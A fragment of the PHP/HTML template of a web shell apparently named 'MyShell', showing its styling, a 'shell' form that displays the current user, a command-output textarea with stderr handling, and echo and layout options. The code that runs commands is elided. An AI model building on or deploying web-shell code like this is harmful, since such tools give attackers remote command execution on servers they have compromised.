...
<html>
<head>
<title><?php echo $MyShellVersion?></title>
<style>
body{
        ...
        scrollbar-3dlight-color:  <?php echo $bgColor ?>;
        scrollbar-darkshadow-color:  <?php echo $bgColor ?>;
        scrollbar-track-color:  <?php echo $bgInputColor ?>;
        scrollbar-arrow-color:  <?php echo $textColor ?>;
}
input,select,option{
        background-color: <?php echo $bgInputColor ?>;
        color : <?php echo $outColor ?>;
        border-style : none;
        font-size : 10px;
}
textarea{
...
<body <?php echo "bgcolor=$bgColor TEXT=$textColor LINK=$linkColor VLINK=$linkColor onload=document.shell.$focus"?>>
<form name="shell" method="post">
Current User: <a href="#" style="text-decoration:none"><?php echo $whoami?></a>
<input type="hidden" name=whoami value=<?php echo $whoami?>>
&nbsp;&nbsp;:::::::&nbsp;&nbsp;
<?php 
if($editMode){
...
?>
<br>
<textarea name="shellOut" cols="<?php  echo $oCols ?>" rows="<?php echo $oRows."\""; if(!$editMode)echo "readonly";else echo $editWrap?> >
<?php
echo $shellOutput;
if ($command) {
  if ($stderr) {
...
?>
&nbsp; | &nbsp;<input type="checkbox" name="echoCommand"<?php if($echoCommand)echo " checked"?>>Echo commands
&nbsp; | &nbsp;Cols:<input type="text" name="oCols" size=3 value=<?php echo $oCols?>>
&nbsp;Rows:<input type="text" name="oRows" size=2 value=<?php echo $oRows?>>
